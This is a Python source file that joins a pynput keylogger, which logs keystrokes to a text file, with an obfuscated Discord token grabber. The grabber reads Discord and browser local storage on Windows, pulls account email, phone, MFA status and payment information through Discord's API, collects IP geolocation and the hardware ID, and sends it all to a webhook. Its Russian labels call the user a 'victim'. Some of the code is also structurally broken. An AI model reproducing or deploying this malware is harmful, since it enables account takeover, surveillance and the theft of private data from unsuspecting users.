import pynput

from pynput.keyboard import Key, Listener
from mainfile import non

def main_1():
    def on_press(key):
        count = 0
        keys = []
        global keys, count

        keys.append(key)
        count += 1
        print("{0} pressed".format(key))

        if count >= 10:
            count = 0
            write_file(keys)
            keys = []


    def write_file(keys):
        with open("Log.txt", "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                elif k.find("Key") == -1:
                    f.write(k)


    def on_release(key):
        if key == Key.esc:
            return False


    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()







def main_2():
    def on_press(key):
        count = 0
        keys = []

        global keys, count

        keys.append(key)
        count += 1
        print("{0} pressed".format(key))

        if count >= 10:
            count = 0
            write_file_2(keys)
            keys = []


    def write_file_2(keys):
        with open("Log.txt", "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                elif k.find("Key") == -1:
                    f.write(k)


    def on_release(key):
        if key == Key.esc:
            return False


    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


























    import re, os
    from mainfile import web

    if os.name != "nt":
        exit()
    from re import findall
    import json
    import platform as plt
    from json import loads, dumps
    from base64 import b64decode
    from subprocess import Popen, PIPE
    from urllib.request import Request, urlopen
    from datetime import datetime
    from threading import Thread
    from time import sleep
    from sys import argv

    webhook_url = web  # line:1
    languages = {'da': 'Danish, Denmark', 'de': 'German, Germany', 'en-GB': 'English, United Kingdom',
                 'en-US': 'English, United States', 'es-ES': 'Spanish, Spain', 'fr': 'French, France',
                 'hr': 'Croatian, Croatia', 'lt': 'Lithuanian, Lithuania', 'hu': 'Hungarian, Hungary',
                 'nl': 'Dutch, Netherlands', 'no': 'Norwegian, Norway', 'pl': 'Polish, Poland',
                 'pt-BR': 'Portuguese, Brazilian, Brazil', 'ro': 'Romanian, Romania', 'fi': 'Finnish, Finland',
                 'sv-SE': 'Swedish, Sweden', 'vi': 'Vietnamese, Vietnam', 'tr': 'Turkish, Turkey',
                 'cs': 'Czech, Czechia, Czech Republic', 'el': 'Greek, Greece', 'bg': 'Bulgarian, Bulgaria',
                 'ru': 'Russian, Russia', 'uk': 'Ukranian, Ukraine', 'th': 'Thai, Thailand', 'zh-CN': 'Chinese, China',
                 'ja': 'Japanese', 'zh-TW': 'Chinese, Taiwan', 'ko': 'Korean, Korea'}  # line:32
    LOCAL = os.getenv("LOCALAPPDATA")  # line:34
    ROAMING = os.getenv("APPDATA")  # line:35
    PATHS = {"Discord": ROAMING + "\\Discord", "Discord Canary": ROAMING + "\\discordcanary",
             "Discord PTB": ROAMING + "\\discordptb", "Google Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default",
             "Opera": ROAMING + "\\Opera Software\\Opera Stable",
             "Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
             "Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"}  # line:44

    def getheaders(token=None, content_type="application/json"):  # line:47
        O000O0O00OOO0000O = {"Content-Type": content_type,
                             "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"}  # line:51
        if token:  # line:52
            O000O0O00OOO0000O.update({"Authorization": token})  # line:53
        return O000O0O00OOO0000O  # line:54

    def getuserdata(OO0OO0OOO00OOO000):  # line:57
        try:  # line:58
            return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me",
                                         headers=getheaders(OO0OO0OOO00OOO000))).read().decode())  # line:60
        except:  # line:61
            pass  # line:62

    def gettokens(O0000000O00O0OO00):  # line:65
        O0000000O00O0OO00 += "\\Local Storage\\leveldb"  # line:66
        OOO0O0000OOOO000O = []  # line:67
        for O0000O00O00OOO0OO in os.listdir(O0000000O00O0OO00):  # line:68
            if not O0000O00O00OOO0OO.endswith(".log") and not O0000O00O00OOO0OO.endswith(".ldb"):  # line:69
                continue  # line:70
            for O0O0OO0O00000OOO0 in [OOO0OOO00O0O0OOO0.strip() for OOO0OOO00O0O0OOO0 in
                                      open(f"{O0000000O00O0OO00}\\{O0000O00O00OOO0OO}", errors="ignore").readlines() if
                                      OOO0OOO00O0O0OOO0.strip()]:  # line:71
                for O0O0O0OOOO0O00000 in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):  # line:72
                    for OOOO0OO00O0O0OOO0 in findall(O0O0O0OOOO0O00000, O0O0OO0O00000OOO0):  # line:73
                        OOO0O0000OOOO000O.append(OOOO0OO00O0O0OOO0)  # line:74
        return OOO0O0000OOOO000O  # line:75

    def getdeveloper():  # line:78
        OOOO000OOOOO00000 = "Discord Token Grabber"  # line:79
        try:  # line:80
            OOOO000OOOOO00000 = urlopen(Request("https://pastebin.com/raw/0cXQ5ULy")).read().decode()  # line:81
        except:  # line:82
            pass  # line:83
        return OOOO000OOOOO00000  # line:84

    def getip():  # line:87
        OOO00OOO0O0OOO0OO = OOOOO0O00000000OO = O00O0O0000OO00OOO = OO0OO0000OOOOO000 = O000OOOOOOO000OOO = O0O0O00O0O0O0OOOO = OO00OOOOO000OOOOO = "None"  # line:88
        try:  # line:89
            OOO0O00OOO00OO00O = 'http://ipinfo.io/json'  # line:90
            O00OO0O0OO0OOO0O0 = urlopen(OOO0O00OOO00OO00O)  # line:91
            OOO00OO0O0OOOO0O0 = json.load(O00OO0O0OO0OOO0O0)  # line:92
            OOO00OOO0O0OOO0OO = OOO00OO0O0OOOO0O0['ip']  # line:93
            OOOOO0O00000000OO = OOO00OO0O0OOOO0O0['org']  # line:94
            O00O0O0000OO00OOO = OOO00OO0O0OOOO0O0['loc']  # line:95
            OO0OO0000OOOOO000 = OOO00OO0O0OOOO0O0['city']  # line:96
            O000OOOOOOO000OOO = OOO00OO0O0OOOO0O0['country']  # line:97
            O0O0O00O0O0O0OOOO = OOO00OO0O0OOOO0O0['region']  # line:98
            OO00OOOOO000OOOOO = "https://www.google.com/maps/search/google+map++" + O00O0O0000OO00OOO  # line:99
        except:  # line:100
            pass  # line:101
        return OOO00OOO0O0OOO0OO, OOOOO0O00000000OO, O00O0O0000OO00OOO, OO0OO0000OOOOO000, O000OOOOOOO000OOO, O0O0O00O0O0O0OOOO, OO00OOOOO000OOOOO  # line:102

    def getavatar(OO0O0O0O00O0O0O0O, O0OOO0OOO0O0OOO00):  # line:105
        OO00000O00O000OOO = f"https://cdn.discordapp.com/avatars/{OO0O0O0O00O0O0O0O}/{O0OOO0OOO0O0OOO00}.gif"  # line:106
        try:  # line:107
            urlopen(Request(OO00000O00O000OOO))  # line:108
        except:  # line:109
            OO00000O00O000OOO = OO00000O00O000OOO[:-4]  # line:110
        return OO00000O00O000OOO  # line:111

    def gethwid():  # line:114
        OOO00O0OO00OOOOOO = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE,
                                  stderr=PIPE)  # line:115
        return (OOO00O0OO00OOOOOO.stdout.read() + OOO00O0OO00OOOOOO.stderr.read()).decode().split("\n")[1]  # line:116

    def has_payment_methods(O0OOOOO0O00000OO0):  # line:119
        try:  # line:120
            return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources",
                                                  headers=getheaders(
                                                      O0OOOOO0O00000OO0))).read().decode())) > 0)  # line:122
        except:  # line:123
            pass  # line:124

    def main():  # line:127
        global webhook_url  # line:128
        O0000O00OOO0OOO0O = ROAMING + "\\.cache~$"  # line:129
        OO0OO0O00000O0OOO = True  # line:130
        OOOO00OOO0OO00OOO = True  # line:131
        OO000O0OO000O0OOO = []  # line:132
        OOO00O00OOO0OO000 = []  # line:133
        O0O0OO0OOO0O0O00O = []  # line:134
        OO00O0OO0O00000O0 = []  # line:135
        OOOOOO0O0O0OO0OOO = []  # line:136
        O0O000O0OOOOOO0OO = plt.platform()  # line:137
        OO0OOOO000OOOOOO0, O00OO0O0O0OO00OOO, OO000OO00O0O00OO0, O0O000O0O0OOOOO00, OO00OO0OOOOO0OO0O, OOOOOO0OO0000O00O, O000OOOOO0O00O00O = getip()  # line:138
        O0O0O0OO00OOO000O = os.getenv("UserName")  # line:139
        OO0O0OO0O00O00OOO = os.getenv("COMPUTERNAME")  # line:140
        O0OOO0OOO0OO0O000 = os.getenv("userprofile").split("\\")[2]  # line:141
        O000O0O00O00O000O = getdeveloper()  # line:142
        for OO000000OO0OO000O, O0O00O00000000OOO in PATHS.items():  # line:143
            if not os.path.exists(O0O00O00000000OOO):  # line:144
                continue  # line:145
            for OO0O0OO0OOO0O0OOO in gettokens(O0O00O00000000OOO):  # line:146
                if OO0O0OO0OOO0O0OOO in O0O0OO0OOO0O0O00O:  # line:147
                    continue  # line:148
                O0O0OO0OOO0O0O00O.append(OO0O0OO0OOO0O0OOO)  # line:149
                O0OO0O00O00O0O000 = None  # line:150
                if not OO0O0OO0OOO0O0OOO.startswith("mfa."):  # line:151
                    try:  # line:152
                        O0OO0O00O00O0O000 = b64decode(OO0O0OO0OOO0O0OOO.split(".")[0].encode()).decode()  # line:153
                    except:  # line:154
                        pass  # line:155
                    if not O0OO0O00O00O0O000 or O0OO0O00O00O0O000 in OOOOOO0O0O0OO0OOO:  # line:156
                        continue  # line:157
                OO00O00OOO00OO000 = getuserdata(OO0O0OO0OOO0O0OOO)  # line:158
                if not OO00O00OOO00OO000:  # line:159
                    continue  # line:160
                OOOOOO0O0O0OO0OOO.append(O0OO0O00O00O0O000)  # line:161
                OOO00O00OOO0OO000.append(OO0O0OO0OOO0O0OOO)  # line:162
                O00OOOO0O00OO000O = OO00O00OOO00OO000["username"] + "#" + str(
                    OO00O00OOO00OO000["discriminator"])  # line:163
                O00O000OOOO0O00OO = OO00O00OOO00OO000["id"]  # line:164
                OO00OO0000O0O0O00 = OO00O00OOO00OO000['locale']  # line:165
                OOOO00OO0OOO0OOO0 = OO00O00OOO00OO000["avatar"]  # line:166
                O000OO0O0O000O0O0 = getavatar(O00O000OOOO0O00OO, OOOO00OO0OOO0OOO0)  # line:167
                OOO00O0O00O0O0O00 = OO00O00OOO00OO000.get("email")  # line:168
                OO000OO0O00OOO00O = OO00O00OOO00OO000.get("phone")  # line:169
                O0OOOO00OOO00O00O = OO00O00OOO00OO000['verified']  # line:170
                O0OO0OOO0O000O0OO = OO00O00OOO00OO000['mfa_enabled']  # line:171
                O0OOOO0OOO000OO00 = OO00O00OOO00OO000['flags']  # line:172
                OOOOO0O0OOO00O0O0 = datetime.utcfromtimestamp(
                    ((int(O00O000OOOO0O00OO) >> 22) + 1420070400000) / 1000).strftime(
                    '%d-%m-%Y %H:%M:%S UTC')  # line:175
                O00O0000O00OOOO00 = languages.get(OO00OO0000O0O0O00)  # line:177
                OOOOO000000O000O0 = bool(OO00O00OOO00OO000.get("premium_type"))  # line:178
                OO0OOOO00O0OOO000 = bool(has_payment_methods(OO0O0OO0OOO0O0OOO))  # line:179
                O0OOOOOO000O00OOO = {"color": 0xd53444, "fields": [{"name": "```— ОБЩАЯ ИНФОРМАЦИЯ О АККАУНТЕ —```",
                                                                    "value": f'Email: {OOO00O0O00O0O0O00}\nТелефон: {OO000OO0O00OOO00O}\nАктивная подписка Nitro: {OOOOO000000O000O0}\nПлатежные данные: {OO0OOOO00O0OOO000}\nСтатус 2FA/MFA: {O0OO0OOO0O000O0OO}',
                                                                    "inline": True},
                                                                   {"name": "```— ПРОЧАЯ ИНФОРМАЦИЯ О ЖЕРТВЕ —```",
                                                                    "value": f'IP адрес жертвы: {OO0OOOO000OOOOOO0}\nМестоположение: {O00O0000O00OOOO00}\nСграбленно из: {OO000000OO0OO000O}\nПодтвержденная почта: {O0OOOO00OOO00O00O}\nАвторизирован: {OOOOO0O0OOO00O0O0}',
                                                                    "inline": True}, {
                                                                       "name": "**ТОКЕН ЖЕРТВЫ ДЛЯ АВТОРИЗАЦИИ НА ЕГО АККАУНТЕ**",
                                                                       "value": OO0O0OO0OOO0O0OOO, "inline": False}],
                                     "author": {"name": f"{O00OOOO0O00OO000O} ({O00O000OOOO0O00OO})",
                                                "icon_url": O000OO0O0O000O0O0},
                                     "footer": {"text": f"{O000O0O00O00O000O}"}}  # line:206
                OO000O0OO000O0OOO.append(O0OOOOOO000O00OOO)  # line:207
        with open(O0000O00OOO0OOO0O, "a") as OO000O0O0O000OO00:  # line:208
            for OO0O0OO0OOO0O0OOO in O0O0OO0OOO0O0O00O:  # line:209
                if not OO0O0OO0OOO0O0OOO in OO00O0OO0O00000O0:  # line:210
                    OO000O0O0O000OO00.write(OO0O0OO0OOO0O0OOO + "\n")  # line:211
        if len(OOO00O00OOO0OO000) == 0:  # line:213
            OOO00O00OOO0OO000.append('123')  # line:214
        O0O0O00O0O0O0O00O = {"content": "", "embeds": OO000O0OO000O0OOO,
                             "username": "Discord Token Grabber by Mal", }  # line:219
        try:  # line:220
            urlopen(Request(webhook_url, data=dumps(O0O0O00O0O0O0O00O).encode(), headers=getheaders()))  # line:221
        except:  # line:222
            pass

if non == 'y':
    main_1()
elif non == 'n':
    main_2()
else:
    exit()